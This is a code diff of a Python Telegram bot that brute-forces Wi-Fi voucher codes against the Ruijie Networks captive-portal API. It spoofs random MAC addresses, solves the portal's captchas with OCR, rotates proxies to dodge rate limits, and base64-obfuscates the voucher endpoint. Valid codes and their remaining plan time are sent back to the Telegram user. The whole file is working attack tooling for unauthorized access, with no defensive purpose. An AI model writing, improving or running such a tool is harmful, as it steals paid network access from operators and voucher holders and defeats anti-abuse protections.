@@ -797,16 +1067,16 @@ async def run_bruteforce(mode, chat_id, session_url, scan_id,
 
             async def _check(code):
                 async with _voucher_sem:
-                    return await perform_check(
-                        session_url, code, chat_id, scan_id, message=message
-                    )
+                    return await perform_check(session_url, code, chat_id, scan_id, message=message)
 
             await asyncio.gather(*[_check(code) for code in batch], return_exceptions=True)
             checked += len(batch)
-            found = len(success_texts.get(chat_id, []))
+
+            found   = len(success_texts.get(chat_id, []))
             elapsed = time.monotonic() - scan_start
-            speed = (checked / elapsed * 60) if elapsed > 0 else 0
-            text = format_progress(checked, total, speed, found)
+            speed   = (checked / elapsed * 60) if elapsed > 0 else 0
+            text    = format_progress(checked, total, speed, found)
+
             try:
                 await bot.edit_message_text(
                     chat_id=chat_id, message_id=progress_msg.message_id, text=text
@@ -819,7 +1089,7 @@ async def run_bruteforce(mode, chat_id, session_url, scan_id,
                     print(f"Progress error: {err}")
 
         # Completed
-        found = len(success_texts.get(chat_id, []))
+        found       = len(success_texts.get(chat_id, []))
         finish_text = (
             f"🔍Scanning Completed\n\n"
             f"📦Checked : {checked:,}" + (f"/{total:,}" if total else "") +
@@ -831,16 +1101,10 @@ async def run_bruteforce(mode, chat_id, session_url, scan_id,
             )
         except Exception:
             await bot.send_message(chat_id, finish_text)
+
         await send_success_file(chat_id)
+
     finally:
-        # Stop captcha pool filler
-        if _filler_task and not _filler_task.done():
-            _filler_task.cancel()
-            try:
-                await _filler_task
-            except asyncio.CancelledError:
-                pass
-        _captcha_pool = None
         await send_success_file(chat_id)
         scan_tasks.pop(chat_id, None)
         success_messages.pop(chat_id, None)
@@ -855,7 +1119,7 @@ async def run_bruteforce(mode, chat_id, session_url, scan_id,
 # Session / Captcha helpers
 # ───────────────────────────────────────────────────────────
 def get_mac():
-    fb = random.choice([0x02, 0x06, 0x0A, 0x0E])
+    fb  = random.choice([0x02, 0x06, 0x0A, 0x0E])
     mac = [fb] + [random.randint(0x00, 0xFF) for _ in range(5)]
     return ':'.join(f'{x:02x}' for x in mac)
 
@@ -863,17 +1127,27 @@ def replace_mac(url, new_mac):
     return re.sub(r'(?<=mac=)[^&]+', new_mac, url)
 
 async def get_session_id(sess, session_url, previous_session_id=None):
-    mac = get_mac()
+    mac        = get_mac()
     session_url = replace_mac(session_url, new_mac=mac)
     headers = {
-        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        'accept':       'text/html,application/xhtml+xml,*/*;q=0.8',
+        'user-agent':   'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        'cookie':       ('sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2219e0ddbd9f2152-'
+                         '0df941f2efc6b08-4c657b58-1327104-19e0ddbd9f3a60%22%7D'),
     }
+    
+    # Use dynamic proxy for session ID request
+    proxy = await proxy_rotator.get_proxy_url()
+    
     try:
-        async with sess.get(session_url, headers=headers, allow_redirects=True, proxy=get_next_proxy_url()) as req:
+        async with sess.get(session_url, headers=headers, allow_redirects=True, proxy=proxy) as req:
             m = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url))
             return m.group(1) if m else previous_session_id
-    except Exception:
+    except Exception as e:
+        print(f"Session ID error with proxy {proxy}: {e}")
+        # Report proxy failure
+        if proxy:
+            await proxy_rotator.report_proxy_failure(proxy)
         return previous_session_id
 
 _ocr = ddddocr.DdddOcr(show_ad=False)
@@ -883,151 +1157,68 @@ def _ocr_sync(image_bytes):
     img   = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
     if img is None:
         return None
-    # 2× upscale — OCR accuracy တိုးသည်
-    img  = cv2.resize(img, None, fx=2, fy=2, interpolation=cv2.INTER_CUBIC)
-    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
-    # Denoise
-    gray = cv2.fastNlMeansDenoising(gray, h=10)
-    # Sharpen
-    kernel = np.array([[0,-1,0],[-1,5,-1],[0,-1,0]])
-    gray   = cv2.filter2D(gray, -1, kernel)
-    # Otsu threshold
+    gray  = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)
     blur  = cv2.GaussianBlur(gray, (3, 3), 0)
     _, th = cv2.threshold(blur, 0, 255, cv2.THRESH_BINARY + cv2.THRESH_OTSU)
-    # Morphological close
-    k  = cv2.getStructuringElement(cv2.MORPH_RECT, (2, 2))
-    th = cv2.morphologyEx(th, cv2.MORPH_CLOSE, k)
     _, bf = cv2.imencode('.png', th)
-
-    result = _ocr.classification(bf.tobytes()).upper()
-
-    # Garbage Collection — Memory မပြည့်စေရန် ချက်ချင်းရှင်းထုတ်ခြင်း
-    del nparr, img, gray, kernel, blur, th, bf
-    gc.collect() 
-
-    return result
+    return _ocr.classification(bf.tobytes()).upper()
 
 async def Captcha_Text(image_bytes):
     return await asyncio.to_thread(_ocr_sync, image_bytes)
 
 async def Captcha_Image(sess, session_id):
     headers = {
-        'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
-        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
+        'authority':    'portal-as.ruijienetworks.com',
+        'accept':       'image/*,*/*;q=0.8',
+        'user-agent':   'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
     }
     params = {'sessionId': session_id, '_t': str(time.time())}
+    
+    # Use dynamic proxy
+    proxy = await proxy_rotator.get_proxy_url()
+    
     try:
         async with sess.get(
-            'https://portal-as.ruijienetworks.com/api/auth/captcha',
-            params=params, headers=headers, proxy=get_next_proxy_url()
+            'https://portal-as.ruijienetworks.com/api/auth/captcha/image',
+            params=params, headers=headers, proxy=proxy
         ) as req:
             return await req.read()
-    except Exception:
-        return b""
+    except Exception as e:
+        print(f"Captcha image error with proxy {proxy}: {e}")
+        if proxy:
+            await proxy_rotator.report_proxy_failure(proxy)
+        raise
 
 async def Varify_Captcha(sess, session_id, text):
     headers = {
+        'authority':    'portal-as.ruijienetworks.com',
+        'accept':       '*/*',
         'content-type': 'application/json',
-        'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
+        'origin':       'https://portal-as.ruijienetworks.com',
+        'user-agent':   'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
     }
+    
+    # Use dynamic proxy
+    proxy = await proxy_rotator.get_proxy_url()
+    
     try:
         async with sess.post(
             'https://portal-as.ruijienetworks.com/api/auth/captcha/verify',
-            headers=headers,
-            json={'sessionId': session_id, 'authCode': text},
-            proxy=get_next_proxy_url()
+            headers=headers, proxy=proxy,
+            json={'sessionId': session_id, 'authCode': text}
         ) as req:
             data = await req.json()
             print(f"[Captcha] authCode={text} success={data.get('success')}")
             return session_id if data.get("success") else None
-    except Exception:
+    except Exception as e:
+        print(f"Captcha verify error with proxy {proxy}: {e}")
+        if proxy:
+            await proxy_rotator.report_proxy_failure(proxy)
         return None
 
 # ───────────────────────────────────────────────────────────
-# Captcha pool — background pre-solver
+# Core voucher check
 # ───────────────────────────────────────────────────────────
-async def _solve_one_captcha(pool, session_url):
-    """Solve one captcha and push to pool."""
-    try:
-        async with aiohttp.ClientSession(
-            connector=_connector,
-            connector_owner=False,
-            cookie_jar=aiohttp.CookieJar(),
-            timeout=aiohttp.ClientTimeout(total=15),
-        ) as ts:
-            sid = await get_session_id(ts, session_url)
-            if not sid:
-                return
-            for _ in range(10):
-                try:
-                    img = await Captcha_Image(ts, sid)
-                    if not img:
-                        continue
-                    text = await Captcha_Text(img)
-                    if text and await Varify_Captcha(ts, sid, text):
-                        try:
-                            pool.put_nowait((sid, text))
-                        except asyncio.QueueFull:
-                            pass
-                        return
-                except Exception:
-                    continue
-    except Exception:
-        pass
-
-async def _fill_captcha_pool(pool, session_url, scan_id, chat_id):
-    """Background task — keeps captcha pool full."""
-    global _captcha_sem
-    while True:
-        cur = scan_tasks.get(chat_id)
-        if not cur or cur.get("scan_id") != scan_id or cur.get("stop"):
-            return
-        needed = CAPTCHA_POOL_SIZE - pool.qsize()
-        if needed > 0:
-            tasks = [
-                asyncio.create_task(_solve_one_captcha(pool, session_url))
-                for _ in range(min(needed, CAPTCHA_SOLVERS))
-            ]
-            await asyncio.gather(*tasks, return_exceptions=True)
-        else:
-            await asyncio.sleep(0.05)
-
-async def _solve_captcha_once(session_url):
-    """Solve one captcha on-demand (for recheck mode)."""
-    async with aiohttp.ClientSession(
-        connector=_connector,
-        connector_owner=False,
-        cookie_jar=aiohttp.CookieJar(),
-        timeout=aiohttp.ClientTimeout(total=20),
-    ) as ts:
-        sid = await get_session_id(ts, session_url)
-        if not sid:
-            return None, None
-        for _ in range(10):
-            try:
-                img = await Captcha_Image(ts, sid)
-                if not img:
-                    continue
-                text = await Captcha_Text(img)
-                if text and await Varify_Captcha(ts, sid, text):
-                    return sid, text
-            except Exception:
-                continue
-        return None, None
-
-# ───────────────────────────────────────────────────────────
-# Core voucher check (pool-based — 1 HTTP request per code)
-# ───────────────────────────────────────────────────────────
-POST_URL = base64.b64decode(
-    b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
-).decode()
-
-_VOUCHER_HEADERS = {
-    "content-type": "application/json",
-    "user-agent": ("Mozilla/5.0 (Linux; Android 12; K) "
-                   "AppleWebKit/537.36 Chrome/139.0.0.0 Mobile Safari/537.36"),
-}
-
 async def perform_check(session_url, code, chat_id, scan_id=None,
                         recheck=False, message=None):
     if not recheck:
@@ -1035,67 +1226,98 @@ async def perform_check(session_url, code, chat_id, scan_id=None,
         if not cur or cur.get("scan_id") != scan_id:
             return
 
-    # ── Get captcha ──────────────────────────────────────
-    if recheck:
-        # On-demand solve for recheck
-        session_id, auth_code = await _solve_captcha_once(session_url)
-        if not session_id:
-            return
-    else:
-        # Pull pre-solved captcha from pool (fast path)
-        pool = _captcha_pool
-        if pool is None:
-            return
-        try:
-            session_id, auth_code = await asyncio.wait_for(pool.get(), timeout=8.0)
-        except asyncio.TimeoutError:
-            return None
+    post_url = base64.b64decode(
+        b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM='
+    ).decode()
 
-    # ── Single voucher POST ──────────────────────────────
     response = None
-    try:
+
+    for attempt in range(3):
+        timeout = aiohttp.ClientTimeout(total=30)
+        
+        # Get dynamic proxy for this attempt
+        proxy = await proxy_rotator.get_proxy_url()
+        
         async with aiohttp.ClientSession(
-            connector=_connector,
-            connector_owner=False,
-            cookie_jar=aiohttp.CookieJar(),
-            timeout=aiohttp.ClientTimeout(total=12),
+            connector=_connector, connector_owner=False,
+            cookie_jar=aiohttp.CookieJar(), timeout=timeout
         ) as ts:
-            async with ts.post(
-                POST_URL,
-                json={"accessCode": code, "sessionId": session_id,
-                      "apiVersion": 1, "authCode": auth_code},
-                headers=_VOUCHER_HEADERS,
-                proxy=get_next_proxy_url(),
-            ) as req:
-                response = await req.text()
-    except Exception as e:
-        print(f"[voucher] {e}")
-        return None
+            session_id = await get_session_id(ts, session_url, None)
+            if not session_id:
+                continue
+
+            auth_code = None
+            for _ in range(8):
+                try:
+                    image = await Captcha_Image(ts, session_id)
+                    text  = await Captcha_Text(image)
+                    if text and await Varify_Captcha(ts, session_id, text):
+                        auth_code = text
+                        break
+                except Exception as e:
+                    print(f"[captcha] {e}")
+            if not auth_code:
+                continue
+
+            if not recheck:
+                cur = scan_tasks.get(chat_id)
+                if not cur or cur.get("scan_id") != scan_id or cur.get("stop"):
+                    return
+
+            try:
+                async with ts.post(
+                    post_url,
+                    json={"accessCode": code, "sessionId": session_id,
+                          "apiVersion": 1, "authCode": auth_code},
+                    headers={
+                        "authority":    "portal-as.ruijienetworks.com",
+                        "accept":       "*/*",
+                        "content-type": "application/json",
+                        "origin":       "https://portal-as.ruijienetworks.com",
+                        "user-agent":   ("Mozilla/5.0 (Linux; Android 12; K) "
+                                         "AppleWebKit/537.36 Chrome/139.0.0.0 Mobile Safari/537.36"),
+                    },
+                    proxy=proxy
+                ) as req:
+                    response = await req.text()
+                    print(f"[voucher] code={code} attempt={attempt+1} resp={response[:60]}")
+            except Exception as e:
+                print(f"[perform_check] {e}")
+                if proxy:
+                    await proxy_rotator.report_proxy_failure(proxy)
+                return
+
+        if response and 'request limited' in response:
+            response = None
+            continue
+        break
 
     if not response:
-        return None
-
-    if 'request limited' in response:
-        return None  # captcha pool filler ကသစ်ဖြည့်မည်
+        return
 
     # ── SUCCESS ──────────────────────────────────────────
     if 'logonUrl' in response:
         if recheck:
             return code
+
         expire_date, _ = await Code_Expires_Date(session_id)
-        success_texts.setdefault(chat_id, []).append(f"🎫 {code}\n {expire_date}")
+
+        success_texts.setdefault(chat_id, []).append(f"🎫 {code}\n   {expire_date}")
+
         current = user_data.setdefault(chat_id, {}).get('current_display_codes', [])
-        current.append(f"🎫 {code}\n {expire_date}")
+        current.append(f"🎫 {code}\n   {expire_date}")
         code_line = "\n\n".join(current)
+
         await SUCCESS_CODE.put({"chat_id": chat_id, "code": code})
+
         if message:
             try:
                 if chat_id not in success_messages or len(code_line) > 4000:
                     sent = await bot.send_message(
-                        message.chat.id, f"Success Codes:\n\n🎫 {code}\n {expire_date}"
+                        message.chat.id, f"Success Codes:\n\n🎫 {code}\n   {expire_date}"
                     )
-                    success_messages[chat_id] = sent.message_id
-                    user_data[chat_id]['current_display_codes'] = [f"🎫 {code}\n {expire_date}"]
+                    success_messages[chat_id]              = sent.message_id
+                    user_data[chat_id]['current_display_codes'] = [f"🎫 {code}\n   {expire_date}"]
                 else:
                     try:
                         await bot.edit_message_text(
@@ -1106,10 +1328,10 @@ async def perform_check(session_url, code, chat_id, scan_id=None,
                         user_data[chat_id]['current_display_codes'] = current
                     except Exception:
                         sent = await bot.send_message(
-                            message.chat.id, f"Success Codes:\n\n🎫 {code}\n {expire_date}"
+                            message.chat.id, f"Success Codes:\n\n🎫 {code}\n   {expire_date}"
                         )
-                        success_messages[chat_id] = sent.message_id
-                        user_data[chat_id]['current_display_codes'] = [f"🎫 {code}\n {expire_date}"]
+                        success_messages[chat_id]              = sent.message_id
+                        user_data[chat_id]['current_display_codes'] = [f"🎫 {code}\n   {expire_date}"]
             except Exception as e:
                 print(f"Success message error: {e}")
 
@@ -1142,8 +1364,8 @@ def Minute_to_Hour(total_minutes):
     if total_minutes == 'Unknown':
         return 'Unknown'
     try:
-        mins = int(total_minutes)
-        hours = mins // 60
+        mins    = int(total_minutes)
+        hours   = mins // 60
         rem_min = mins % 60
         if hours > 0 and rem_min > 0:
             return f"{hours}h {rem_min}m"
@@ -1155,41 +1377,54 @@ def Minute_to_Hour(total_minutes):
         return 'Unknown'
 
 async def Code_Expires_Date(active_id):
-    url = f'https://portal-as.ruijienetworks.com/api/auth/voucher/{active_id}'
+    paths = [
+        f'https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{active_id}',
+        f'https://portal-as.ruijienetworks.com/api/macc/balance/getBalance/{active_id}',
+        f'https://portal-as.ruijienetworks.com/api/maccauth/balance/getBalance/{active_id}',
+        f'https://portal-as.ruijienetworks.com/api/auth/balance/getBalance/{active_id}',
+    ]
     headers = {
-        'accept': 'application/json, text/javascript, */*; q=0.01',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        'authority':        'portal-as.ruijienetworks.com',
+        'accept':           'application/json, text/javascript, */*; q=0.01',
+        'user-agent':       'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
         'x-requested-with': 'XMLHttpRequest',
     }
+    
+    # Use dynamic proxy
+    proxy = await proxy_rotator.get_proxy_url()
+    
     async with aiohttp.ClientSession(
         connector=_connector, connector_owner=False,
         cookie_jar=aiohttp.CookieJar(),
         timeout=aiohttp.ClientTimeout(total=10)
     ) as fs:
-        try:
-            async with fs.get(url, headers=headers, proxy=get_next_proxy_url()) as req:
-                if req.status == 200:
-                    respond = await req.json()
-                    if respond.get('success'):
-                        result = respond.get('result', {})
-                        raw_mins = result.get('totalMinutes') or result.get('remainingMinutes') or 'Unknown'
-                        profile = result.get('profileName', 'Unknown')
-                        totaltime = Minute_to_Hour(raw_mins)
-                        return f"📋 Plan: {profile} | ⏳ Time: {totaltime}", raw_mins
-        except Exception as e:
-            print(f"[Code_Expires_Date] {e}")
+        for url in paths:
+            try:
+                async with fs.get(url, headers=headers, proxy=proxy) as req:
+                    if req.status == 200:
+                        respond = await req.json()
+                        if respond.get('success'):
+                            result     = respond.get('result', {})
+                            raw_mins   = result.get('totalMinutes') or result.get('remainingMinutes') or 'Unknown'
+                            profile    = result.get('profileName', 'Unknown')
+                            totaltime  = Minute_to_Hour(raw_mins)
+                            return f"📋 Plan: {profile} | ⏳ Time: {totaltime}", raw_mins
+            except Exception as e:
+                print(f"[Code_Expires_Date] {e}")
+                if proxy:
+                    await proxy_rotator.report_proxy_failure(proxy)
     return "📋 Plan: Unknown | ⏳ Time: Unknown", 'Unknown'
 
 # ───────────────────────────────────────────────────────────
-# Polling (timeout fix — request_timeout > timeout)
+# Polling  (timeout fix — request_timeout > timeout)
 # ───────────────────────────────────────────────────────────
 async def start_polling():
     backoff = 5
     while True:
         try:
             await bot.infinity_polling(
-                timeout=45,        # long-poll wait
-                request_timeout=55, # aiohttp timeout — MUST be > timeout
+                timeout=45,          # long-poll wait (Telegram holds connection)
+                request_timeout=55,  # aiohttp timeout — MUST be > timeout
                 interval=0,
             )
             return
@@ -1207,25 +1442,37 @@ async def start_polling():
 # ───────────────────────────────────────────────────────────
 async def main():
     global session, _connector
+    
+    # Initialize proxy rotator first
+    await proxy_rotator.initialize()
+    print(f"[Main] Proxy rotator initialized with {len(proxy_rotator.proxies)} proxies")
+    
     _connector = aiohttp.TCPConnector(
-        limit=500,               # RAM တက်မလာစေရန်
-        limit_per_host=100,      # တပြိုင်နက် connection ကို ၁၀၀
-        ttl_dns_cache=300,
-        ssl=False
+        limit=20000, limit_per_host=10000,
+        ttl_dns_cache=300, ssl=False
     )
     session = aiohttp.ClientSession(
         timeout=aiohttp.ClientTimeout(total=30),
         connector=_connector, connector_owner=False
     )
-    # စဖွင့်ချင်း Proxy list တစ်ခါဆွဲယူထားမည်
-    await fetch_fresh_free_proxies()
     try:
         asyncio.create_task(web_server())
         asyncio.create_task(github_update_scheduler())
+        
+        # Start proxy refresh scheduler
+        async def proxy_refresh_scheduler():
+            while True:
+                await asyncio.sleep(PROXY_REFRESH_INTERVAL)
+                await proxy_rotator.refresh_proxies()
+                print(f"[ProxyScheduler] Refreshed proxies. Total: {len(proxy_rotator.proxies)}")
+                
+        asyncio.create_task(proxy_refresh_scheduler())
+        
         await start_polling()
     finally:
         await session.close()
         await _connector.close()
+        await proxy_rotator.close()
 
 if __name__ == '__main__':
     asyncio.run(main())
